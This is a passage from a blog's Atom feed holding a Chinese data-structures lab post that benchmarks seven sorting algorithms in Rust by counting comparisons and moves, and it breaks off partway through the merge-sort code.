<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Auceptin&#39;s Blog</title>
  <icon>https://aucept.in/icon.png</icon>
  
  <link href="https://aucept.in/atom.xml" rel="self"/>
  
  <link href="https://aucept.in/"/>
  <updated>2025-12-23T10:05:35.865Z</updated>
  <id>https://aucept.in/</id>
  
  <author>
    <name>Auceptin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据结构-排序实验</title>
    <link href="https://aucept.in/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-12-22T05:03:55.000Z</published>
    <updated>2025-12-23T10:05:35.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="内部排序算法比较"><a href="#内部排序算法比较" class="headerlink" title="内部排序算法比较"></a>内部排序算法比较</h3><blockquote><p>对7种常用的内部排序算法进行比较：直接插入排序、希尔排序、冒泡排序、快速排序、简单选择排序、堆排序、二路归并排序。<br>待排序表的表长不少于100；其中的数据要用伪随机数产生程序产生；至少要用5组不同的输入数据作比较；比较的指标为关键字参加的比较次数和数据元素的移动次数（关键字交换计为3次移动）。<br>对不同的输入表长做试验，观察两个指标相对于表长的变化关系，也可以对稳定性做验证。</p></blockquote><h3 id="统计成绩"><a href="#统计成绩" class="headerlink" title="统计成绩"></a>统计成绩</h3><blockquote><p>给出n个学生的m门考试的成绩表，每个学生的信息由学号、姓名以及各科成绩组成。对学生的考试成绩进行有关统计，并打印统计表。<br>①按总分由高到低的顺序，打印出名次表，分数相同的为同一名次；<br>②按名次打印出每个学生的学号、姓名、总分以及各科成绩。</p></blockquote><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>一些经验，rust对于类型要求很严格，所以用作索引的一律用usize，因为for循环里的i默认是，统计数据用u64，如果u32溢出程序会直接panic</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>mem<span class="token punctuation">::</span></span>swap<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">tracing<span class="token punctuation">::</span></span>info<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span>filter<span class="token punctuation">::</span></span><span class="token class-name">LevelFilter</span><span class="token punctuation">;</span><span class="token keyword">pub</span> <span class="token keyword">struct</span>  <span class="token type-definition class-name">Benchmark</span><span class="token punctuation">&#123;</span>    compare_time <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    move_time <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Sort</span><span class="token punctuation">&#123;</span>    bench <span class="token punctuation">:</span> <span class="token class-name">Benchmark</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Sort</span><span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Sort</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Sort</span><span class="token punctuation">&#123;</span>            bench <span class="token punctuation">:</span> <span class="token class-name">Benchmark</span><span class="token punctuation">&#123;</span>                compare_time <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                move_time <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">compare</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> num1 <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> num2 <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        num1 <span class="token operator">></span> num2    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">insert_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//如果小于，直接跳过</span>                temp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">while</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 与第j-1个元素相比较</span>                    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    j <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">shell_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> dlta <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>dlta<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">shell_insert</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> dlta<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">shell_insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> d <span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// d为步长</span>        <span class="token keyword">let</span> dd <span class="token operator">=</span> d <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>        <span class="token comment">// 分成d次插入排序</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> dd<span class="token punctuation">..</span>nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i <span class="token operator">-</span> dd<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> temp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">while</span> j <span class="token operator">>=</span> dd <span class="token operator">&amp;&amp;</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j <span class="token operator">-</span> dd<span class="token punctuation">]</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> dd<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    j <span class="token operator">-=</span> dd<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">bubble_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> change <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>n<span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> change <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            change <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>n <span class="token operator">-</span> i<span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token comment">// 交换，记录</span>                    nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>                    change <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">quick_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> high <span class="token operator">></span> low <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> pi <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> pi <span class="token operator">></span> low <span class="token punctuation">&#123;</span> <span class="token comment">// 避免pi = 0发生溢出的情况</span>                <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> pi <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> pi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partition</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>high <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> index <span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> low <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> low<span class="token punctuation">..</span>high <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>pivot<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                index <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>high <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        index    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">select_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> t <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> target <span class="token operator">=</span> t <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>            <span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find_max</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> t<span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> k <span class="token operator">!=</span> target<span class="token punctuation">&#123;</span>                nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">find_max</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> len<span class="token punctuation">:</span><span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> max <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> max_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                max_index <span class="token operator">=</span> i<span class="token punctuation">;</span>                max <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        max_index    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">heap_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> last_parent <span class="token operator">=</span> <span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span>last_parent<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">sift_down</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">..=</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">sift_down</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">sift_down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> start <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> end <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> parent <span class="token operator">=</span> start<span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> child <span class="token operator">=</span> parent <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> child <span class="token operator">&lt;=</span> end<span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> child <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> end <span class="token operator">&amp;&amp;</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>child <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                child <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>parent<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>child<span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>                parent <span class="token operator">=</span> child<span class="token punctuation">;</span>                child <span class="token operator">=</span> parent <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">merge_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">merge_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">merge_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span>mid<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">merge</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>mid <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> l1 <span class="token operator">=</span> mid <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> l2 <span class="token operator">=</span> right <span class="token operator">-</span> mid<span class="token punctuation">;</span>        <span class="token keyword">let</span> v1 <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token 